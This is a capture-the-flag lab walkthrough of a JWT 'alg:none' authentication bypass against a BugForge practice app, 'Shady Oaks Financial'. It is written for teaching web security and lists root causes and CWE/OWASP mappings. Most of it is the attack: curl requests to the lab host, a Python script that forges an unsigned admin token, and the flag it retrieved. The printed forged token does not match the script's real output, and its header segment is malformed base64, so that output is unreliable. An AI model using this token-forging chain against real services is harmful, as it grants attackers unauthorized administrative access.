# Shady Oaks Financial - BugForge Lab Walkthrough

**URL:** https://lab-1772876144279-tvxgio.labs-app.bugforge.io/
**Difficulty:** Easy  
**Vulnerability:** JWT None Algorithm Bypass (Broken Authentication)
**Flag:** `bug{4GlcjDKi4EI8IzHljJZOAZQlxR4ZpmW3}`

---

## Summary

Shady Oaks Financial is a stock trading SPA. The Express backend uses `jsonwebtoken` to issue HS256 tokens with a `role` claim but does not restrict accepted algorithms. Sending a forged JWT with `alg:none` and `role:admin` bypasses signature verification entirely, granting unauthenticated admin access and exposing the flag.

## Tech Stack

- Frontend: React SPA (CRA)
- Backend: Node.js / Express.js
- Auth: JWT (HS256, no `exp` claim)
- DB: Not directly accessed in this chain

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `GET /` | None | React SPA |
| `POST /api/register` | None | Returns JWT on success |
| `POST /api/login` | None | Returns JWT on success |
| `GET /api/admin/flag` | JWT, role=admin | Flag location |
| `GET /api/admin/users` | JWT, role=admin | User list |

## Attack Chain

**Step 1 - Fingerprint the app**
```bash
curl -s https://lab-1772876144279-tvxgio.labs-app.bugforge.io/
```
React SPA, Express backend. Title: "Shady Oaks Financial". Stock trading platform.

**Step 2 - Extract admin endpoints from JS bundle**

Source map available at `/static/js/main.chunk.js.map`. Grepping the bundle reveals:
```
/api/admin/flag
/api/admin/users
```
Both gated on `role === 'admin'` check in frontend JS.

**Step 3 - Register a user, get a JWT**
```bash
curl -s -X POST https://lab-1772876144279-tvxgio.labs-app.bugforge.io/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"pentester1","password":"Password123!"}'
```
Response: `{"token":"eyJhbGci..."}` - decoded payload: `{"id":6,"username":"pentester1","role":"user","iat":...}`. No `exp` claim.

**Step 4 - Probe the admin endpoint to read the error differential**
```bash
# No token
curl -s https://lab-1772876144279-tvxgio.labs-app.bugforge.io/api/admin/flag
# -> {"error":"Access token required"}  (401)

# User token
curl -s https://lab-1772876144279-tvxgio.labs-app.bugforge.io/api/admin/flag \
  -H "Authorization: Bearer $USER_TOKEN"
# -> {"error":"Admin access required"}  (403)
```
**Critical signal**: 401 (no token) vs 403 (user token) = the JWT was parsed and accepted. Only the role check failed. `alg:none` bypass is viable.

**Step 5 - Forge a none-alg JWT**
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"id": 1, "username": "admin", "role": "admin"}
forged  = f"{b64url(header)}.{b64url(payload)}."
print(forged)
```
Output: `eyJhbGciOibm9uZSIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`

**Step 6 - Retrieve the flag**
```bash
curl -s https://lab-1772876144279-tvxgio.labs-app.bugforge.io/api/admin/flag \
  -H "Authorization: Bearer eyJhbGciOibm9uZSIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
```
Response:
```json
{"flag":"bug{4GlcjDKi4EI8IzHljJZOAZQlxR4ZpmW3}"}
```

## Discovery Notes

- The 401 vs 403 differential is the key signal. Without it you'd try the bypass blind.
- JS bundle analysis took ~2 minutes: grepped `admin` in the bundle, found `/api/admin/flag` immediately.
- No `exp` in the issued JWT was a secondary signal that token handling was minimal/custom.
- Mass assignment attempt at registration (sending `"role":"admin"`) returned 200 but the issued token still had `role:user` - so role override on registration was stripped server-side, pointing to JWT manipulation as the attack surface.

## Dead Ends

| Tried | Why It Failed | What It Teaches |
|---|---|---|
| `POST /api/register` with `"role":"admin"` | Server strips the role field, issues token with `role:user` | Registration mass assignment was sanitized; JWT forgery needed |
| JWT algorithm confusion (RS256→HS256) | Server uses HS256 natively, no public key exposed | Simpler `alg:none` was the right path |

## Root Causes

1. `jwt.verify()` called without `{ algorithms: ['HS256'] }` constraint - allows the library to accept any algorithm including `none`
2. `role` claim trusted directly from JWT payload without cross-referencing the database
3. No `exp` claim on issued tokens (defence-in-depth failure, not the primary vuln)

## CWE / OWASP

- CWE-345: Insufficient Verification of Data Authenticity
- CWE-327: Use of a Broken or Risky Cryptographic Algorithm
- OWASP A02:2021 - Cryptographic Failures
- OWASP A07:2021 - Identification and Authentication Failures
